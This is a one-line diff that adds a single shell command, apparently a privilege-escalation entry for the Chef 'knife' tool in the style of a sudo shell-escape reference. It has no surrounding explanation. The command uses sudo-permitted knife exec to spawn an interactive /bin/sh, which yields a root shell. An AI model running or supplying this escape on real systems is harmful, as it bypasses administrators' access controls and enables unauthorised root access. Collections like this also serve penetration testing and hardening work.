@@ -1,0 +1,1 @@
+sudo knife exec --exec "exec '/bin/sh -i'"
